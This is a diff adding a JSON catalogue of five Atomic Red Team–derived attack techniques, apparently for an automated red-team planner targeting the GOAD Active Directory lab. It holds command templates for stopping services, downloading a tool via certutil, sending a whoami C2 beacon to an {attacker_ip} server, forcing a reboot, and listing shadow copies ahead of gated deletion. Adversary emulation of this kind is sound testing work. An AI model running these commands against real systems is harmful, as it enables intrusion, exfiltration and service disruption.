@@ -1,0 +1,128 @@
+[
+  {
+    "uuid": "goad-impact-t1489-windows-0",
+    "name": "service_stop_windows",
+    "mitre_technique": "T1489",
+    "mitre_tactic": "TA0040",
+    "description": "Stop a Windows service by name using PowerShell Stop-Service; verifies final state",
+    "source": "Atomic Red Team T1489 Windows variant (GOAD AD lab patch)",
+    "command_template": "Stop-Service -Name {service_name} -Force; Get-Service -Name {service_name} | Select-Object Name, Status 2>&1",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "dos_service"
+    },
+    "cost": 0.10,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-impact-c2-depth-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-c2-t1105-certutil-0",
+    "name": "ingress_tool_certutil",
+    "mitre_technique": "T1105",
+    "mitre_tactic": "TA0011",
+    "description": "Download attacker tool to target via certutil LOLBin (-urlcache); verify file exists",
+    "source": "Atomic Red Team T1105 Windows certutil variant (GOAD AD lab patch)",
+    "command_template": "certutil -urlcache -split -f {tool_url} C:\\Windows\\Temp\\{task_name}.exe && dir C:\\Windows\\Temp\\{task_name}.exe 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["outbound_http_allowed"]
+    },
+    "effects": {
+      "grants_access": "tool_available",
+      "creates_artifact": "dropped_file"
+    },
+    "cost": 0.15,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-impact-c2-depth-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-c2-t1071001-https-0",
+    "name": "https_c2_beacon",
+    "mitre_technique": "T1071.001",
+    "mitre_tactic": "TA0011",
+    "description": "Send HTTPS C2 beacon from target to attacker server using Invoke-WebRequest; exfil whoami",
+    "source": "Atomic Red Team T1071.001 (GOAD AD lab hand-crafted)",
+    "command_template": "Invoke-WebRequest -Uri http://{attacker_ip}:{c2_port}/beacon -Method POST -Body (whoami) -UseBasicParsing 2>&1",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["outbound_http_allowed"]
+    },
+    "effects": {
+      "grants_access": "c2_channel"
+    },
+    "cost": 0.30,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-impact-c2-depth-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-impact-t1529-0",
+    "name": "system_shutdown_reboot",
+    "mitre_technique": "T1529",
+    "mitre_tactic": "TA0040",
+    "description": "Schedule a forced reboot of the target Windows host in 30 seconds via shutdown.exe",
+    "source": "Atomic Red Team T1529 (GOAD AD lab hand-crafted)",
+    "command_template": "shutdown /r /t 30 /c \"System maintenance\" && echo \"Shutdown scheduled in 30s\" 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "dos_host"
+    },
+    "cost": 0.05,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-impact-c2-depth-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-impact-t1485-0",
+    "name": "delete_shadow_copies",
+    "mitre_technique": "T1485",
+    "mitre_tactic": "TA0040",
+    "description": "List VSS shadow copies (RoE-gated dry-run); real deletion suppressed until RoE approved",
+    "source": "Atomic Red Team T1485 (GOAD AD lab hand-crafted, RoE gated)",
+    "command_template": "vssadmin list shadows && echo \"Would delete shadow copies (RoE gated)\" 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": ["vss"],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "data_destruction"
+    },
+    "cost": 0.05,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-impact-c2-depth-v1", "confidence": 1.0}
+  }
+]
